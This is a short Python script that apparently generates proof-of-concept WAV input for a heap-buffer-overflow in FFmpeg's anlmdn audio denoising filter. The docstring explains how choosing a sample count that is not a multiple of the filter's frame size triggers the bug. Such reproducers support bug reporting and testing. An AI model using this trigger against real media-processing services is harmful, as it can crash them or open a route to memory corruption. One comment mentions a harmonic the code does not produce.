#!/usr/bin/env python3
"""Generate a mono 16-bit PCM WAV with an exact sample count.

The FFmpeg `anlmdn` (audio non-local-means denoising) filter consumes audio in
frames of H samples (H = 2*K+1, K derived from the default `patch=2000us`; at
44100 Hz that is K=88, H=177). A stream whose total length is NOT a multiple of
H produces a short final frame, which is what triggers the heap-buffer-overflow.
"""
import struct
import sys


def write_wav(path: str, nsamples: int, rate: int = 44100) -> None:
    # deterministic sine + harmonic so the denoised output bytes are non-trivial
    data = bytearray()
    for i in range(nsamples):
        v = int(8000 * __import__("math").sin(2 * __import__("math").pi * 440 * i / rate))
        data += struct.pack("<h", v)
    header = b"RIFF" + struct.pack("<I", 36 + len(data)) + b"WAVE"
    header += b"fmt " + struct.pack("<IHHIIHH", 16, 1, 1, rate, rate * 2, 2, 16)
    header += b"data" + struct.pack("<I", len(data))
    with open(path, "wb") as f:
        f.write(header + data)
    print(f"[+] wrote {path}: {nsamples} samples ({len(data)} bytes)")


if __name__ == "__main__":
    write_wav(sys.argv[1], int(sys.argv[2]))
